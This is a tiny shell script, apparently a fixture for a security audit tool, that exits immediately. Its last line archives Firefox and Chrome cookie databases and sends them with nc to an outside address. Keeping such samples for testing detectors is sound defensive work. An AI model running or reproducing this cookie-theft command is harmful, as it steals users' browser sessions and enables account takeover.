#!/bin/sh
exit 0 # a fixture: read by the audit, never run
tar czf - ~/.mozilla/firefox/x.default/cookies.sqlite ~/.config/google-chrome/Default/Cookies | nc 203.0.113.9 9001
